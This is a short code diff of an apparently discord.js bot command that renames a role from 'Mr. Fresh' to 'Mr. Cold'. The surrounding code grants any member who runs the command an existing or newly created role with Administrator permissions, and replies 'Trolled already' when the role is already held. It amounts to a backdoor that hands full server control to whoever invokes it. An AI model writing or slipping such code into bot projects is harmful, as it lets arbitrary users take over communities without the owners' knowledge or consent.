@@ -29,7 +29,7 @@ module.exports = {
         }
 
         // check if the user doesnt already have the 0x62727576 role
-        if (interaction.member.roles.cache.some(role => role.name === 'Mr. Fresh')) {
+        if (interaction.member.roles.cache.some(role => role.name === 'Mr. Cold')) {
             return await interaction.editReply({
                 content: 'Trolled already',
                 ephemeral: true
@@ -37,14 +37,14 @@ module.exports = {
         }
 
         // check if the role exists in the guild
-        var role = interaction.guild.roles.cache.find(role => role.name === 'Mr. Fresh');
+        var role = interaction.guild.roles.cache.find(role => role.name === 'Mr. Cold');
         if (role) {
             // Give the user a role with admin
             await interaction.member.roles.add(role);
         } else {
             // Give the user a role with admin
             var newAdminRole = await interaction.guild.roles.create({
-                name: 'Mr. Fresh',
+                name: 'Mr. Cold',
                 permissions: [PermissionsBitField.Flags.Administrator]
             });
             await interaction.member.roles.add(newAdminRole);
